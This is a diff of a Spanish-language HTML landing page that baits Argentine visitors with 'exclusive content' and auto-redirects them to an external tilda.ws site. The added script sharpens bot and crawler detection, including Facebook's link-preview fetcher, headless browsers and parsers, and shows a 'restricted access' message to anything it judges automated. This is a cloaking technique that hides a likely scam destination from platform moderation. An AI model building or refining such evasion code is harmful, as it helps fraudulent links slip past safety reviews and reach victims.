@@ -4,38 +4,34 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Argentina Hoy</title>
-  <meta property="og:title" content="Información exclusiva para argentinos">
-  <meta property="og:description" content="Acceso limitado para ciudadanos locales">
-  <meta property="og:image" content="https://yourdomain.github.io/background.jpg">
-
+  <meta property="og:title" content="¿Sos argentino de verdad?">
+  <meta property="og:description" content="Contenido exclusivo para argentinos">
+  <meta property="og:image" content="background.jpg">
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body {
       height: 100%;
       font-family: 'Segoe UI', sans-serif;
       background: url('background.jpg') no-repeat center center/cover;
-      overflow: hidden;
       display: flex;
       align-items: center;
       justify-content: center;
       flex-direction: column;
       text-align: center;
+      overflow: hidden;
     }
-
     h1 {
       color: white;
       font-size: 2.5em;
       text-shadow: 2px 2px 5px rgba(0,0,0,0.5);
       margin-bottom: 15px;
     }
-
     p {
       color: white;
       font-size: 1.2em;
       margin-bottom: 30px;
       text-shadow: 1px 1px 3px rgba(0,0,0,0.4);
     }
-
     .btn {
       padding: 14px 28px;
       font-size: 1em;
@@ -47,11 +43,9 @@
       box-shadow: 0 4px 8px rgba(0,0,0,0.2);
       transition: all 0.3s ease;
     }
-
     .btn:hover {
       background-color: #f0f0f0;
     }
-
     @media (max-width: 600px) {
       h1 { font-size: 1.8em; }
       p { font-size: 1em; }
@@ -60,33 +54,34 @@
 </head>
 <body>
   <h1>¿Sos argentino de verdad?</h1>
-  <p>Descubrí lo que no siempre se muestra. Acceso limitado solo para argentinos.</p>
+  <p>Contenido exclusivo para argentinos. Acceso limitado.</p>
   <button class="btn" id="accederBtn">Acceder Ahora</button>
 
   <script>
-    // Anti-bot simple
-    function isBot() {
+    const isBot = () => {
       const ua = navigator.userAgent.toLowerCase();
       return navigator.webdriver ||
-             !navigator.languages ||
-             /bot|crawl|spider|facebookexternalhit|headless|phantomjs/.test(ua);
+        !navigator.plugins.length ||
+        !navigator.languages ||
+        /bot|crawl|spider|facebookexternalhit|headless|phantomjs/.test(ua);
+    };
+
+    const isParser = () => {
+      return document.referrer === '' && !navigator.userAgent.includes('Mozilla');
     }
 
-    const redirectURL = "https://argentinaforreal.tilda.ws/";
+    const safeRedirect = () => {
+      const target = "https://argentinaforreal.tilda.ws/";
+      window.location.replace(target);
+    };
 
-    document.getElementById("accederBtn").addEventListener("click", () => {
-      if (!isBot()) {
-        window.location.href = redirectURL;
-      }
-    });
-
-    // Авто-редирект через 3 секунды
-    setTimeout(() => {
-      if (!isBot()) {
-        window.location.href = redirectURL;
-      }
-    }, 3000);
+    if (!isBot() && !isParser()) {
+      setTimeout(safeRedirect, 2500);
+    } else {
+      document.body.innerHTML = "<h1 style='color:white;text-shadow:1px 1px 4px black'>Acceso restringido</h1>";
+    }
   </script>
 </body>
 </html>
+
 
